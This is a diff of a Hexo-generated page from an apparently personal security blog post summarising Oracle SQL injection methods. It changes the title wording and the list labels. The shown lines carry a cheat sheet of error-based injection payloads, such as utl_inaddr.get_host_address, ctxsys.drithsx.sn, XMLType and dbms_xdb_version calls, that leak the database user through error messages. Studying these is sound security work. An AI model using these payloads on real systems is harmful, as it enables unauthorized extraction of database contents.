@@ -6,17 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://yd0ng.github.io">
-  <title>深入理解Oracle数据库注入方式 | 不知名网络安全选手的博客</title>
+  <title>深入学习Oracle数据库注入方式 | 不知名网络安全选手的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="Oracle数据库注入方式总结">
 <meta property="og:type" content="article">
-<meta property="og:title" content="深入理解Oracle数据库注入方式">
+<meta property="og:title" content="深入学习Oracle数据库注入方式">
 <meta property="og:url" content="https://yd0ng.github.io/2020/09/10/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/index.html">
 <meta property="og:site_name" content="不知名网络安全选手的博客">
 <meta property="og:description" content="Oracle数据库注入方式总结">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-09-09T16:09:49.000Z">
-<meta property="article:modified_time" content="2020-09-10T13:16:23.933Z">
+<meta property="article:modified_time" content="2020-09-14T06:27:31.189Z">
 <meta property="article:author" content="yd0ng">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
@@ -142,7 +142,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      深入理解Oracle数据库注入方式
+      深入学习Oracle数据库注入方式
     </h1>
   
 
@@ -189,12 +189,12 @@
 <li>utl_inaddr.get_host_address()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_inaddr.get_host_address(&#39;~&#39;||(select user from dual)||&#39;~&#39;) from dual;</span><br></pre></td></tr></table></figure></li>
 <li>ctxsys.drithsx.sn()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;ctxsys.drithsx.sn(1,(select user from dual))</span><br></pre></td></tr></table></figure></li>
 <li>ctxsys.ctx_report.token_type()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ctxsys.ctx_report.token_type((select user from dual), &#39;1&#39;) from dual;</span><br></pre></td></tr></table></figure></li>
-<li>XMLType<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null</span><br></pre></td></tr></table></figure></li>
-<li>dbms_xdb_version.checkin<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null</span><br></pre></td></tr></table></figure></li>
-<li>dbms_xdb_version.makeversioned<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null</span><br></pre></td></tr></table></figure></li>
-<li>dbms_xdb_version.uncheckout<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null</span><br></pre></td></tr></table></figure></li>
-<li>dbms_utility.sqlid_to_sqlhash<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null</span><br></pre></td></tr></table></figure></li>
-<li>ordsys.ord_dicom.getmappingxpath<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;ordsys.ord_dicom.getmappingxpath((select user from dual))</span><br></pre></td></tr></table></figure>
+<li>XMLType()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null</span><br></pre></td></tr></table></figure></li>
+<li>dbms_xdb_version.checkin()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null</span><br></pre></td></tr></table></figure></li>
+<li>dbms_xdb_version.makeversioned()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null</span><br></pre></td></tr></table></figure></li>
+<li>dbms_xdb_version.uncheckout()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null</span><br></pre></td></tr></table></figure></li>
+<li>dbms_utility.sqlid_to_sqlhash()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null</span><br></pre></td></tr></table></figure></li>
+<li>ordsys.ord_dicom.getmappingxpath()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;ordsys.ord_dicom.getmappingxpath((select user from dual))</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
